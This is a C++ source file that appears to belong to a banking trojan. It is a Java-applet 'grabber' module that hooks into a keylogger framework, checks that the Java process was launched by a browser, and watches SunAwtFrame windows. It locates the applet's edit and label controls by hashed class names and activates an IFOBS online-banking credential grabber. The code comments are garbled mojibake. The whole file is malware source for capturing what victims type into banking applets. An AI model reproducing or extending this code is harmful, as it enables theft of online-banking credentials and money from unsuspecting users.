//---------------------------------------------------------------------------

#pragma hdrstop

#include "GetApi.h"
#include "JavaAppletGrabbers.h"
#include "Utils.h"

#include "Modules.h"
//---------------------------------------------------------------------------


void ActivateJavaAppletGrabber(HWND JafaFrameWnd, const char* URL, bool IsChildWindow);


//--------------------------------------------------------
//  ������ ��� ������� ����� ����� � ��� �������
//--------------------------------------------------------
const static DWORD JavaAppletEditClassNameHashes[] = {0xCB934F4 /* edit */,
													  0x7D5D13E5 /* richedit20w */,
													  0	};

const static PCHAR SunAvtCanvasWnd = "SunAwtCanvas";




// ���� ������
HWND JavaAppletWnd = 0 ;



void WINAPI JavaAppletShowWndEvent(PKeyLogger Logger, DWORD EventID,
	LPVOID Data)
{
	PShowWindowData SW = (PShowWindowData)Data;

	if (SW->Command == SW_HIDE)
	{
		if (SW->Window == JavaAppletWnd)
        	JavaAppletWnd = 0;

		return;
    }

	// ��������� ������������ ����
	DWORD Hash = GetWndClassHash(SW->Window, true);
	if (Hash != 0x809BB5B9 /* sunawtframe */) return;

	if (JavaAppletWnd != SW->Window)
	{
		PCHAR URL = GetURLFromJavaProcess();
		JavaAppletWnd = SW->Window;
		bool IsChildWindow = pGetParent(SW->Window) != NULL;

		ActivateJavaAppletGrabber(JavaAppletWnd, URL, IsChildWindow);
	}
}



//-----------------------------------------------
//  ������� �������������� ������� �������� �
//  ��� �������
//-----------------------------------------------
bool InitializeJavaAppletGrabbers()
{
	JavaAppletWnd = 0;


	PKeyLogger KLG = KeyLogger::GetKeyLogger();
	// ����������� ������ � �������� ��� ��������� �� ��� ��������
	// �������� ����������
	if (!KLG || KLG->Process != PROCESS_JAVA)
		return false;

	DWORD PID = GetParentPID();
	DWORD Hash = GetHashForPid(PID);
	// ���� ��������� �������������� ��� � ��������� ���������
	// �� ������� �����
	const static DWORD Hashes[] = {PROCESS_HASH_IE,
								   PROCESS_HASH_FIREFOX,
								   PROCESS_HASH_CHROME,
								   0};

	bool ParentIsBrowser = false;
	for (int i = 0; Hashes[i] != 0; i++)
		if (Hashes[i] == Hash)
		{
			ParentIsBrowser = true;
			break;
		}

	if (ParentIsBrowser)
	{
		// ������������ � ������� ����������� ����
		KeyLogger::ConnectEventHandler(KLE_AFTER_SHOW_WND, JavaAppletShowWndEvent);
	}
	return ParentIsBrowser;
}



//-----------------------------------------------
//  IsJavaEditWindow - ������� ���������� ������
//                     ���� �������� ����������
//                     ����� ��� ������
//-----------------------------------------------
bool IsJavaEditWindow(HWND Wnd)
{
	DWORD Hash = GetWndClassHash(Wnd, true);
	for (int i = 0; JavaAppletEditClassNameHashes[i] != 0; i++)
	{
		if (JavaAppletEditClassNameHashes[i] == Hash)
			return true;
    }
    return false;
}

//-----------------------------------------------
//  IsJavaLabelWindow - ������� ���������� ������
//                     ���� �������� �������
//                     ��������
//-----------------------------------------------
bool IsJavaLabelWindow(HWND Wnd)
{
	return GetWndClassHash(Wnd, true) == 0x22FB71B0 /* sunawtlabel */;
}




//-----------------------------------------------
//  GetSunAwtCanvasWnd - ������� ���������� ����
//                       SunAwtCanvas
//-----------------------------------------------
HWND GetSunAwtCanvasWnd(HWND SunAwtFrameWnd)
{
	return (HWND)pFindWindowExA(SunAwtFrameWnd, NULL, SunAvtCanvasWnd, NULL);
}




//============================================================================
void ActivateJavaAppletGrabber(HWND JafaFrameWnd, const char* URL, bool IsChildWindow)
{
	// �������������� IfobsOnline
	#ifdef IfobsOnlineH
		IfobsOnline::Initialize(JafaFrameWnd, URL);
	#endif

}




